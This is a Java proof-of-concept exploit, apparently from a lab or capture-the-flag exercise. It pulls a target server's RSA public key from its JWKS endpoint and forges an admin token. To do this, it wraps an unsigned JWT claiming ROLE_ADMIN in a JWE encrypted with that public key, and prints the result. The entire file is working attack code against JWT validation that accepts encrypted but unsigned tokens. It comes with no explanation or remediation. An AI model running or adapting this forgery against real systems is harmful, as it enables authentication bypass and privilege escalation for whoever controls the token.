import com.nimbusds.jose.*;
import com.nimbusds.jose.crypto.*;
import com.nimbusds.jwt.*;
import com.nimbusds.jose.jwk.*;
import com.nimbusds.jose.jwk.source.*;
import com.nimbusds.jose.proc.SecurityContext;
import java.security.interfaces.RSAPublicKey;
import java.util.Date;
import java.util.List;
import java.net.URL;

public class Poc {
    public static void main(String[] args) throws Exception {
        // === ATTACKER SIDE ===
        // Only has the RSA public key
        URL jwksURL = new URL("http://10.129.244.220:8080/api/auth/jwks");
        JWKSource<SecurityContext> keySource =
            new RemoteJWKSet<>(jwksURL);

        var keys = keySource.get(new JWKSelector(
            new JWKMatcher.Builder().keyType(KeyType.RSA).build()
        ), null);

        RSAKey rsaKey = (RSAKey) keys.get(0);
        RSAPublicKey publicKey = rsaKey.toRSAPublicKey();

        // Step 1: Craft malicious claims
        JWTClaimsSet maliciousClaims = new JWTClaimsSet.Builder()
            .subject("lolxd")
            .claim("role", "ROLE_ADMIN")
            .expirationTime(
                new Date(System.currentTimeMillis() + 3_600_000))
            .build();

        // Step 2: Create UNSIGNED PlainJWT
        PlainJWT innerJwt = new PlainJWT(maliciousClaims);

        // Step 3: Wrap as JWE using only the public key
        JWEObject jweObject = new JWEObject(
            new JWEHeader.Builder(
                JWEAlgorithm.RSA_OAEP_256, EncryptionMethod.A256GCM)
                .contentType("JWT")
                .build(),
            new Payload(innerJwt.serialize())
        );
        jweObject.encrypt(new RSAEncrypter(publicKey));
        String maliciousToken = jweObject.serialize();

        System.out.println("[ATTACKER] Token crafted using only public key");
        System.out.println("[ATTACKER] " + maliciousToken);
    }
}
